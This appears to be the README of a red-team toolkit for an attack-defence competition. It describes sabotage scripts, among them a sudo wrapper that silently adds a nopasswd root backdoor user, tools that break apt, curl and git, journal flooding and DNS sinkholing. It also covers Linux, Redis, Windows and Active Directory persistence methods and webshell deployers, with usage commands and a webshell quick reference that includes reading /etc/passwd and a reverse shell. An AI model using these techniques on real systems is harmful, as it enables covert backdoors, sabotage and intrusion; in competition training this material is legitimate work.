# Tooling descriptions

## Map
```
├── alias-bashrc.sh
├── break-net-tools.sh
├── compromise-w-who.sh
├── evil-timer
│   ├── deploy-evil-timer.sh
│   ├── poison-timer.sh
│   ├── python2-certbot.service
│   └── python2-certbot.timer
├── flood-journal.sh
├── infinite-users.sh
├── no-apt.sh
├── persist
│   ├── ad_persist.sh
│   ├── linux_persist.sh
│   ├── redis_persist.sh
│   └── windows_persist.ps1
├── pihole-github-sinkhole.sh
├── README.md
├── reconboard-v5
│   └── ...
├── sinkhole-scripts.sh
├── sudo-biNOry.sh
├── the-toucher.sh
├── vandalize-bashrc.sh
├── webshells
│   ├── deploy_lamp_shell.sh
│   ├── deploy_nginx_flask_shell.sh
│   └── shell.php
└── yay-install.sh
```

## Desc
| tool name | functionality |
| --- | --- |
| alias-bashrc.sh | searches for .bashrc files and injects a sudo() shell function that silently flushes nftables every time sudo is run, whether the user confirms or cancels |
| break-net-tools.sh | breaks curl, wget, and git via binary shadowing + proxy poisoning + shell function injection, all reversible, local git ops still work so scoring doesnt break |
| compromise-w-who.sh | backs up the `w` and `who` binaries then overwrites them with fakes, `w` shows hardcoded fake session data, `who` just says "better question is, where?" |
| evil-timer | poison-timer.sh is the real one, deploy-evil-timer.sh is just the old placeholder that deploys the certbot timer which doesnt do anything |
| flood-journal.sh | disables journald rate limiting and compression then launches 8 parallel workers writing ~4kb log entries directly to /dev/log as fast as possible, cron watchdog respawns it if killed, journal vacuum takes 10-30min to recover |
| infinite-users.sh | symlinks nologin to bash so any service account can get a shell, also writes a sudoers.d entry giving all those accounts full nopasswd root |
| no-apt.sh | renames sources.list and sources.list.d so apt-get silently breaks, blue team cant install or update anything without knowing why |
| pihole-github-sinkhole.sh | installs pihole unattended and sinkholes all github domains (github.com, githubusercontent.com, ghcr.io, etc) to 0.0.0.0, also poisons /etc/hosts as a backup layer |
| sinkhole-scripts.sh | sets up a dnsmasq sinkhole for any domain, defaults to pointing github.com at a dead ip, has install/remove/test |
| sudo-biNOry.sh | replaces /usr/bin/sudo with a wrapper that silently creates a backdoor user `sudoer` with full nopasswd root on first invocation, then passes through normally |
| the-toucher.sh | wanders the filesystem randomly and touches files to corrupt timestamps, messes with log rotation and anything that uses mtime |
| vandalize-bashrc.sh | searches the machine for .bashrc files and adds a big `:3` to them |
| yay-install.sh | installs yay, probably doesnt work on ubuntu but whatever |

## TODO
- Multiple ssh binaries running on different ports
- 20 Docker binaries all running as hidden services

---

## persist/ — Deep Persistence Scripts

| Script | Targets | Methods |
|--------|---------|---------|
| `persist/linux_persist.sh` | svc-ftp-01, svc-redis-01, svc-database-01, svc-amazin-01, svc-samba-01 | SSH authorized_keys, cron, systemd service, SUID bash copy, .bashrc hook |
| `persist/redis_persist.sh` | svc-redis-01, svc-database-01 | Redis RDB write → SSH key injection + /etc/cron.d write |
| `persist/windows_persist.ps1` | svc-ad-01, svc-smb-01 | Scheduled task (SYSTEM), reg Run key, WMI event sub, startup folder VBS, hidden service |
| `persist/ad_persist.sh` | svc-ad-01 | DCSync, golden ticket, backdoor Domain Admin, AdminSDHolder ACL, DNS record injection |

```bash
# Linux (any Ubuntu host)
./persist/linux_persist.sh <target_ip> <user> <pass> <lhost> <lport>

# Redis (unauthenticated open Redis)
./persist/redis_persist.sh <target_ip>

# AD (after getting DA creds)
./persist/ad_persist.sh <dc_ip> <domain.local> Administrator <pass> <lhost>

# Windows (run on a PS shell on target, or via CrackMapExec -X)
#   powershell -ep bypass -File persist/windows_persist.ps1 -LHost <lhost> -LPort 4446
```

## webshells/ — Webshell Deployers

| Script | Target | Technique |
|--------|--------|-----------|
| `webshells/shell.php` | WP/LAMP hosts | Feature-rich PHP webshell (cmd / upload / read / revshell) |
| `webshells/deploy_lamp_shell.sh` | svc-samba-01 (LAMP) | Samba→webroot write, LFI+log poisoning, PHPMyAdmin SELECT INTO OUTFILE |
| `webshells/deploy_nginx_flask_shell.sh` | svc-redis-01 (Flask/Nginx) | Jinja2 SSTI→RCE, Redis session forgery, Nginx alias traversal, Werkzeug debug console |

```bash
chmod +x webshells/*.sh persist/*.sh

# LAMP
./webshells/deploy_lamp_shell.sh <target_ip> guest ""

# Flask/Nginx
./webshells/deploy_nginx_flask_shell.sh <target_ip> 80 6379 <lhost>
```

### shell.php quick ref (password: `rt2025!delta` — change before use)

| Action | URL |
|--------|-----|
| Command | `?p=rt2025!delta&c=id` |
| Read file | `?p=rt2025!delta&act=read&f=/etc/passwd` |
| Upload | `POST ?p=rt2025!delta&act=upload` |
| Rev shell | `?p=rt2025!delta&act=revshell&rh=LHOST&rp=4444` |
